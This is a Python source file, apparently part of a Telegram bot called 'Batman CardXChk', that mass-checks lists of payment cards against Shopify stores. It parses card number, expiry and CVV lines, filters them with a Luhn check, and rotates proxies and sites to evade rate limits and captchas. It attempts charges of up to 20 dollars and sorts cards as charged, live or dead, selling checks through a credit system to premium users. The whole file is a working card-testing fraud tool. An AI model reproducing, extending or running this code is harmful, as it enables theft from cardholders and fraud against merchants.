# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    """
    Returns a raw Telegram inline-keyboard dict so that the extra
    `style` and `icon_custom_emoji_id` fields are preserved — aiogram's
    InlineKeyboardButton drops unknown fields, but passing a plain dict
    lets them pass straight through to the Bot API.
    """
    session  = MSH_SESSIONS.get(session_id, {})
    live_n   = session.get('approved', 0)
    checked  = session.get('checked', 0)

    buttons = [
        [
            {"text": f"Live ({live_n})", "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack(), "style": "success", "icon_custom_emoji_id": BTN_LIVE_EMOJI_ID},
            {"text": f"All ({checked})", "callback_data": MshResultCallback(session_id=session_id, result_type="all").pack(),  "style": "primary", "icon_custom_emoji_id": BTN_ALL_EMOJI_ID},
        ],
    ]
    if is_running:
        buttons.append([
            {"text": "Stop", "callback_data": MshStopCallback(session_id=session_id).pack(), "style": "danger", "icon_custom_emoji_id": BTN_STOP_EMOJI_ID}
        ])
    return {"inline_keyboard": buttons}


def _build_progress_text(session: dict) -> str:
    """
    Progress message UI — matches user spec exactly.
    """
    elapsed  = time.time() - session['start_time']
    minutes  = int(elapsed // 60)
    seconds  = int(elapsed % 60)
    time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    user_obj      = session.get('user_obj')
    plan_emoji_id = session.get('plan_emoji_id', PRO_EMOJI_ID)
    user_link     = build_user_link(user_obj) if user_obj else "User"
    dev_link      = '<a href="https://t.me/Batcardchk">Batman CardXChk</a>'

    return (
        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➳ Shopify 0-20$</b>\n'
        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➳ {session["checked"]}/{session["total"]}</b>\n'
        f'<b>Charged ➳ {session["charged"]} <tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji></b>\n'
        f'<b>Live ➳ {session["approved"]} <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<b>Dead ➳ {session["dead"]} <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n'
        f'<b>Errors ➳ {session["errors"]} <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'<b>Time ➳ {time_str}</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {user_link} '
        f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_link} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )


async def update_progress_message(bot: Bot, session_id: str):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return
    now          = time.time()
    last_update  = session.get('last_update_time', 0)
    is_finished  = session['status'] == "FINISHED"
    is_stopped   = session['status'] == "STOPPED"

    if not is_finished and not is_stopped and (now - last_update) < 1.0:
        return

    text = _build_progress_text(session)
    if session.get('last_text') == text:
        return

    if session_id not in SESSION_LOCKS:
        SESSION_LOCKS[session_id] = asyncio.Lock()

    async with SESSION_LOCKS[session_id]:
        if session.get('last_text') == text:
            return
        is_running   = session['status'] == "CHECKING"
        reply_markup = get_result_buttons(session_id, is_running=is_running)
        await PROGRESS_UPDATE_LIMITER.wait_if_needed()
        try:
            await bot.edit_message_text(
                chat_id=session['chat_id'], message_id=session['msg_id'],
                text=text, parse_mode="HTML", reply_markup=reply_markup,
                disable_web_page_preview=True,
            )
            session['last_text']        = text
            session['last_update_time'] = now
        except TelegramBadRequest as e:
            if "message is not modified" not in str(e).lower() and "message to edit not found" not in str(e).lower():
                logging.error(f"[MSH] Progress update error: {e}")
        except Exception as e:
            logging.error(f"[MSH] Progress update error: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RETRY ERROR LIST
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RETRY_ERRORS = [
    'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na', 'DELIVERY_ZONE_NOT_FOUND',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!', 'VALIDATION_CUSTOM',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed', 'BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP',
    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
    'PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED', 'could not resolve host',
    'connect tunnel failed', 'timeout', 'proxy error',
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'SESSION_ERROR', 'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE',
    'DELIVERY_ZONE_NOT_FOUND', 'DELIVERY_DELIVERY_LINE_DETAIL_CHANGED',
    'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE',
    'DELIVERY_STRATEGY_CONDITIONS_NOT_SATISFIED',
    'no available products found', 'could not extract receiptid',
    'BUYER_IDENTITY_MARKETING_CONSENT_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN',
    'could not extract signedhandles', 'receiptid missing',
    'response missing receiptid', 'INVENTORY_FAILURE',
    'products.json', 'returned status 429', 'returned status 500',
    'returned status 502', 'returned status 503', 'returned status 504',
    'store incompatible', 'extract signedHandles', 'missing receiptId',
    'NO_PRODUCTS', 'NO_PRODUCT', 'VAULT_FAILED', 'MERCHANDISE_OUT_OF_STOCK',
]

DECLINED_RESPONSES = [
    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
    'DO NOT HONOR', 'DO_NOT_HONOR', 'UNKNOWN_ERROR', 'Processing Error',
    'PICK_UP_CARD', 'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
    'CALL_ISSUER', 'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD',
    'TRANSACTION_NOT_ALLOWED',
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT DETECTION  — 3DS_REQUIRED / INCORRECT_CVV /
#                  INSUFFICIENT_FUNDS all count as Live
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def classify_response(message: str) -> str:
    """Returns CHARGED | TDS | LIVE | DEAD | ERROR."""
    mu = message.upper()
    ml = message.lower()

    if "ORDER_PAID" in mu or "CHARGED" in mu:
        return "CHARGED"

    # 3DS — counted under Live, tracked separately
    if "3DS_REQUIRED" in mu:
        return "TDS"

    # Live hits: INSUFFICIENT_FUNDS / INCORRECT_CVV / INCORRECT_CVC / INCORRECT_ZIP
    if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
            or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu):
        return "LIVE"

    if "GENERIC_ERROR" in mu:
        return "DEAD"

    if any(d.upper() in mu for d in DECLINED_RESPONSES):
        return "DEAD"

    # Retry / site errors — caller handles retry logic
    if any(r.lower() in ml for r in RETRY_ERRORS):
        return "RETRY"

    return "ERROR"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session or is_session_stopped(session_id):
        return

    sites_list    = get_sites()
    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        logging.error(f"[MSH] No proxy manager for session {session_id}")
        session['errors'] += 1
        return

    result_status = "ERROR"
    response_msg  = "Unknown Error"
    api_price     = "0.00"
    api_currency  = "USD"
    api_gateway   = "Shopify Payments"
    bin_data      = {}
    used_proxy    = None
    MAX_RETRIES   = 40
    card_start    = time.time()

    parts = cc_formatted.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy

    if is_session_stopped(session_id):
        return

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except Exception:
        bin_data = {}

    tried_sites: list = []

    for attempt in range(1, MAX_RETRIES + 1):
        if is_session_stopped(session_id):
            return

        proxy, ok = proxy_manager.get_next_proxy()
        if not proxy:
            logging.error(f"[MSH] No proxies for session {session_id}")
            session['errors'] += 1
            return
        used_proxy = proxy

        untried = [s for s in sites_list if s not in tried_sites]
        if not untried:
            tried_sites = []; untried = list(sites_list)
        site = random.choice(untried)
        tried_sites.append(site)

        try:
            success, message, url, gateway, price, currency, proxy_status_raw, http_status = \
                await process_card_api(cc=cc, mes=mm, ano=yy, cvv=cvv,
                                       site=site, proxy=proxy, api_url=API_URL)

            if is_session_stopped(session_id):
                return

            api_price    = price
            api_currency = currency
            api_gateway  = gateway
            proxy_manager.report_result(proxy, message, http_status)

            classification = classify_response(message)

            if classification == "CHARGED":
                result_status = "CHARGED"; response_msg = message; break
            if classification == "TDS":
                result_status = "TDS"; response_msg = message; break
            if classification == "LIVE":
                result_status = "LIVE"; response_msg = message; break
            if classification == "DEAD":
                result_status = "DEAD"; response_msg = message; break
            if classification == "RETRY":
                if proxy_manager.is_real_proxy_error(message, http_status):
                    if attempt == MAX_RETRIES:
                        result_status = "ERROR"; response_msg = f"Proxy Error: {message}"; break
                    continue
                if attempt < MAX_RETRIES:
                    await asyncio.sleep(0.2); continue
                result_status = "ERROR"; response_msg = f"Site Error (retried {MAX_RETRIES}x): {message}"; break

            # ERROR
            if attempt < MAX_RETRIES:
                continue
            result_status = "ERROR"; response_msg = message; break

        except asyncio.CancelledError:
            raise
        except Exception as e:
            if is_session_stopped(session_id):
                return
            proxy_manager.report_result(proxy, str(e), None)
            if attempt == MAX_RETRIES:
                result_status = "ERROR"; response_msg = "Connection Error"; break
            continue

    if is_session_stopped(session_id):
        return

    elapsed_s = time.time() - card_start
    logging.info(f"[MSH] {cc_formatted} | {result_status} | {response_msg}")
    session['checked'] += 1

    card_result_data = {
        'card': cc_formatted, 'response': response_msg, 'bin_info': bin_data,
        'price': api_price, 'currency': api_currency, 'gateway': api_gateway,
        'timestamp': datetime.now().isoformat(),
        'proxy_used': mask_proxy(used_proxy) if used_proxy else 'N/A',
    }

    if is_session_stopped(session_id):
        return

    if result_status == "CHARGED":
        session['charged'] += 1
        session['charged_cards'].append(card_result_data)
        await asyncio.to_thread(update_user_stats, user_id, True, True)
        await asyncio.to_thread(log_hit_to_mshh, user_id, user_obj.username, user_obj.first_name)
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        if current_credits >= 2:
            await asyncio.to_thread(update_credits, user_id, current_credits - 2)
        if is_session_stopped(session_id): return
        _tg_run(send_hit_log_to_group(bot, response_msg, "CHARGED", user_obj, plan_name, api_price, api_currency))
        if is_session_stopped(session_id): return
        # For charged DM: if this is a private chat, reply to the command
        is_private = not session.get('is_group', True)
        reply_to = session.get('user_msg_id') if is_private else None
        _tg_run(send_charged_dm(bot, cc_formatted, response_msg, bin_data, api_price, api_currency,
                                elapsed_s, user_obj, plan_name, reply_to_msg_id=reply_to, is_private=is_private))
        await asyncio.sleep(1.0)

    elif result_status == "TDS":
        # 3DS counted in Live, tracked separately for the file
        session['approved'] += 1
        session['live_cards'].append(card_result_data)
        session['tds_cards'].append(card_result_data)
        await asyncio.to_thread(update_user_stats, user_id, False, True)
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        if current_credits >= 1:
            await asyncio.to_thread(update_credits, user_id, current_credits - 1)
        await asyncio.sleep(0.5)

    elif result_status == "LIVE":
        session['approved'] += 1
        session['live_cards'].append(card_result_data)
        await asyncio.to_thread(update_user_stats, user_id, False, True)
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        if current_credits >= 1:
            await asyncio.to_thread(update_credits, user_id, current_credits - 1)

    elif result_status == "DEAD":
        session['dead'] += 1
        session['dead_cards'].append(card_result_data)
        await asyncio.to_thread(update_user_stats, user_id, False)
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        if current_credits >= 1:
            await asyncio.to_thread(update_credits, user_id, current_credits - 1)

    else:  # ERROR
        session['errors'] += 1
        session['error_cards'].append(card_result_data)
        await asyncio.to_thread(update_user_stats, user_id, False)

    if is_session_stopped(session_id):
        return

    if session['checked'] % 50 == 0 or session['checked'] == session['total']:
        _tg_run(update_progress_message(bot, session_id))

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK HANDLERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.callback_query(MshResultCallback.filter())
async def handle_result_callback(callback: types.CallbackQuery, callback_data: MshResultCallback):
    try:
        session_id  = callback_data.session_id
        result_type = callback_data.result_type
        session     = MSH_SESSIONS.get(session_id)
        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True); return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True); return
        if is_buttons_locked(session_id):
            await callback.answer(f"⏳ Please wait {get_remaining_lock(session_id)}s", show_alert=True); return

        count = {
            "live": len(session.get('live_cards', [])),
        }.get(result_type, len(session.get('live_cards', [])) + len(session.get('dead_cards', [])) + len(session.get('error_cards', [])))

        if count == 0 and result_type != "all":
            labels = {"live": "Live"}
            await callback.answer(f"❌ No {labels.get(result_type, '')} cards found", show_alert=True); return

        await callback.answer("📦 Generating report...", show_alert=False)
        user_obj    = session.get('user_obj')
        plan_name   = session.get('plan_name', 'TRIAL')
        user_msg_id = session.get('user_msg_id')
        file_buffer, filename, total_count = generate_result_file(session, result_type, user_obj, plan_name)
        file_content = file_buffer.read(); file_buffer.seek(0)

        type_emojis = {"live": "✅", "all": "📁"}
        type_labels = {"live": "Live", "all": "All"}
        caption = (
            f"Result ➳ {type_labels.get(result_type, 'All')} {type_emojis.get(result_type, '📁')}\n"
            f"Total ➳ <b>{total_count}</b>\n"
            f"Gate ➳ Shopify | 0-20$"
        )
        document = types.BufferedInputFile(file=file_content, filename=filename)
        try:
            await callback.bot.send_document(
                chat_id=callback.message.chat.id, document=document,
                caption=caption, parse_mode="HTML", reply_to_message_id=user_msg_id,
            )
        except TelegramBadRequest as e:
            if "message to reply not found" in str(e).lower():
                await callback.message.answer_document(document=document, caption=caption, parse_mode="HTML")
            else:
                raise
    except Exception as e:
        logging.error(f"[MSH] Result callback error: {e}", exc_info=True)
        try:
            await callback.message.answer(f"❌ Error: <code>{str(e)[:50]}</code>", parse_mode="HTML")
        except Exception:
            pass


@router.callback_query(MshStopCallback.filter())
async def handle_stop_callback(callback: types.CallbackQuery, callback_data: MshStopCallback):
    try:
        session_id = callback_data.session_id
        session    = MSH_SESSIONS.get(session_id)
        if not session:
            await callback.answer("⚠️ Session expired", show_alert=True); return
        if callback.from_user.id != session.get('user_id'):
            await callback.answer("❌ No permission", show_alert=True); return
        if is_buttons_locked(session_id):
            await callback.answer(f"⏳ Please wait {get_remaining_lock(session_id)}s", show_alert=True); return
        if session['status'] != "CHECKING":
            await callback.answer("ℹ️ Not running", show_alert=True); return

        session['status'] = "STOPPED"
        tasks_snapshot    = [t for t in session.get('tasks', []) if not t.done()]
        thread_loop       = session.get('thread_loop')
        if tasks_snapshot and thread_loop and not thread_loop.is_closed():
            async def _do_cancel(task_list):
                for t in task_list: t.cancel()
            fut = asyncio.run_coroutine_threadsafe(_do_cancel(tasks_snapshot), thread_loop)
            try: fut.result(timeout=2)
            except Exception: pass

        await callback.answer("🛑 Stopping...", show_alert=False)
        logging.info(f"🛑 [MSH] Cancelled {len(tasks_snapshot)} tasks")
        session['last_text'] = ""
        await update_progress_message(callback.bot, session_id)
    except Exception as e:
        logging.error(f"[MSH] Stop callback error: {e}", exc_info=True)
        try:
            await callback.answer("❌ Error stopping", show_alert=True)
        except Exception:
            pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MAIN COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/msh") | F.caption.startswith("/msh"))
async def msh_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "msh"):
        await message.reply("🚧 <b>Mass Gate under maintenance.</b>", parse_mode="HTML")
        return

    user    = message.from_user
    user_id = user.id
    bot     = message.bot
    _set_main_loop(asyncio.get_event_loop())

    is_premium, _ = get_premium_status(user_id)
    if not is_premium:
        await message.reply(
            "💎 <b>Please upgrade to use this feature.</b>\n\n👉 Use /buy to upgrade.",
            parse_mode="HTML"
        )
        return

    for sid, sdata in list(MSH_SESSIONS.items()):
        if sdata.get('user_id') == user_id and sdata.get('status') == "CHECKING":
            await message.reply(
                "⚠️ <b>Active Session</b>\n\nYou have a check running.\nUse the <b>Stop</b> button to stop it.",
                parse_mode="HTML"
            )
            return

    proxies = load_msh_proxies()
    if not proxies:
        await message.reply(
            "⚠️ <b>No Proxies!</b>\n\nPlace your rotating proxies (one per line) in <code>mass_gates/px.txt</code>.",
            parse_mode="HTML"
        )
        return

    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts    = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "
    if message.reply_to_message:
        replied_msg = message.reply_to_message
        raw_text += (replied_msg.text or replied_msg.caption or "") + " "

    document = message.document or (message.reply_to_message.document if message.reply_to_message else None)
    if document:
        if document.file_size > 2 * 1024 * 1024:
            await message.reply("❌ File too large. Max 2MB."); return
        try:
            file_info    = await bot.get_file(document.file_id)
            byte_content = await bot.download_file(file_info.file_path)
            if byte_content:
                data      = byte_content.read() if hasattr(byte_content, 'read') else byte_content
                raw_text += data.decode('utf-8', errors='ignore')
        except Exception as e:
            await message.reply(f"❌ Error reading file: {e}"); return

    if not raw_text.strip():
        await message.reply(
            "❌ <b>No cards found.</b>\n\n"
            "• <code>/msh cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/msh</code>\n"
            "• Send .txt file with <code>/msh</code>",
            parse_mode="HTML",
        ); return

    extracted_cards = extract_cards_from_text(raw_text)
    if not extracted_cards:
        await message.reply("❌ No valid card formats found."); return

    valid_cards, expired_count, invalid_luhn_count = [], 0, 0
    for card_string in extracted_cards:
        if len(valid_cards) >= 10000: break
        p = card_string.split('|')
        if len(p) != 4: continue
        cc, mm, yy, cvv = p
        if not luhn_check(cc):  invalid_luhn_count += 1; continue
        if is_expired(mm, yy):  expired_count      += 1; continue
        valid_cards.append((card_string, cc))

    total_cards = len(valid_cards)
    if total_cards == 0:
        info = f"Filtered {invalid_luhn_count} invalid & {expired_count} expired.\n" if (expired_count or invalid_luhn_count) else ""
        await message.reply(f"{info}❌ No valid cards to check.", parse_mode="HTML"); return

    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits < total_cards:
        await message.reply(
            f"❌ <b>Insufficient Credits</b>\n\n"
            f"You need <b>{total_cards}</b> credits to check <b>{total_cards}</b> cards.\n"
            f"Your balance: <b>{current_credits}</b> credits.\n\n"
            f"Please add more credits or reduce the number of cards.",
            parse_mode="HTML",
        ); return

    is_group = message.chat.type in ("group", "supergroup", "channel")
    asyncio.create_task(
        process_mass_check_background(message, bot, valid_cards, user, proxies, is_group)
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_mass_check_background(
    message: types.Message, bot: Bot,
    valid_cards: list, user_obj, proxies, is_group: bool = False
):
    user_id     = user_obj.id
    chat_id     = message.chat.id
    total_cards = len(valid_cards)
    if total_cards == 0:
        await message.reply("❌ No valid cards to check.", parse_mode="HTML"); return

    session_id               = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
    plan_name, plan_emoji_id = await get_user_plan_info(user_id)

    logging.info(f"[MSH] User {user_id} | Session {session_id} | {total_cards} cards")
    proxy_manager = ProxyManager(proxies, session_id)

    user_link = build_user_link(user_obj)
    dev_link  = '<a href="https://t.me/Batcardchk">Batman CardXChk</a>'

    initial_text = (
        f'<b><tg-emoji emoji-id="{PROG_GATE_EMOJI_ID}">🛒</tg-emoji> Gate ➳ Shopify 0-20$</b>\n'
        f'<b><tg-emoji emoji-id="{PROG_PROGRESS_EMOJI_ID}">🔄</tg-emoji> Progress ➳ 0/{total_cards}</b>\n'
        f'<b>Charged ➳ 0 <tg-emoji emoji-id="{PROG_CHARGED_EMOJI_ID}">💎</tg-emoji></b>\n'
        f'<b>Live ➳ 0 <tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji></b>\n'
        f'<b>Dead ➳ 0 <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>\n'
        f'<b>Errors ➳ 0 <tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji></b>\n'
        f'<b>Time ➳ 0s</b>\n'
        f'<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➳ {user_link} '
        f'<tg-emoji emoji-id="{plan_emoji_id}">⭐</tg-emoji></b>\n'
        f'<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➳ {dev_link} '
        f'<tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
    )

    progress_msg = await message.reply(
        initial_text, parse_mode="HTML",
        reply_markup=get_result_buttons(session_id, is_running=True),
        disable_web_page_preview=True,
    )

    MSH_SESSIONS[session_id] = {
        "session_id": session_id, "status": "CHECKING",
        "chat_id": chat_id, "user_id": user_id,
        "msg_id": progress_msg.message_id, "user_msg_id": message.message_id,
        "total": total_cards, "checked": 0, "approved": 0, "charged": 0, "dead": 0, "errors": 0,
        "start_time": time.time(), "tasks": [], "proxies": proxies, "proxy_manager": proxy_manager,
        "bad_proxies": [], "last_text": "", "last_update_time": 0,
        "live_cards": [], "dead_cards": [], "charged_cards": [], "error_cards": [], "tds_cards": [],
        "user_obj": user_obj, "plan_name": plan_name, "plan_emoji_id": plan_emoji_id,
        "is_group": is_group,  # store whether command was in a group
    }

    logging.info(f"🚀 [MSH] Started session {session_id} | {total_cards} cards | user {user_id}")
    main_loop = asyncio.get_event_loop()
    await main_loop.run_in_executor(
        _USER_THREAD_POOL,
        _run_session_in_thread,
        bot, session_id, valid_cards, user_obj, plan_name, main_loop,
    )


def _run_session_in_thread(bot, session_id, cards, user_obj, plan_name, main_loop):
    thread_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(thread_loop)
    session = MSH_SESSIONS.get(session_id)
    if session:
        session['thread_loop'] = thread_loop
    try:
        thread_loop.run_until_complete(
            _session_async_worker(bot, session_id, cards, user_obj, plan_name, main_loop)
        )
    except Exception as e:
        logging.error(f"[MSH] Session thread {session_id} crashed: {e}", exc_info=True)
    finally:
        try: thread_loop.close()
        except Exception: pass


async def _session_async_worker(bot, session_id, cards, user_obj, plan_name, main_loop):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    sem = asyncio.Semaphore(70)

    async def worker(cc_formatted, cc_num):
        if is_session_stopped(session_id): return
        async with sem:
            if is_session_stopped(session_id): return
            try:
                await process_single_card(
                    session_id, cc_formatted, cc_num,
                    session['user_id'], bot, user_obj, plan_name,
                )
            except asyncio.CancelledError:
                raise
            except Exception as e:
                if not is_session_stopped(session_id):
                    logging.error(f"[MSH] Worker error {cc_formatted}: {e}")

    tasks = []
    for cc_formatted, cc_num in cards:
        if is_session_stopped(session_id): break
        task = asyncio.create_task(worker(cc_formatted, cc_num))
        tasks.append(task)
        session['tasks'].append(task)

    logging.info(f"📋 [MSH] {len(tasks)} tasks created for session {session_id}")

    if tasks:
        results   = await asyncio.gather(*tasks, return_exceptions=True)
        cancelled = sum(1 for r in results if isinstance(r, asyncio.CancelledError))
        errors    = sum(1 for r in results if isinstance(r, Exception) and not isinstance(r, asyncio.CancelledError))
        if cancelled: logging.info(f"🛑 [MSH] {cancelled} tasks cancelled in {session_id}")
        if errors:    logging.error(f"[MSH] {errors} tasks failed in {session_id}")

    session = MSH_SESSIONS.get(session_id)
    if session and session['status'] != "STOPPED":
        session['status'] = "FINISHED"
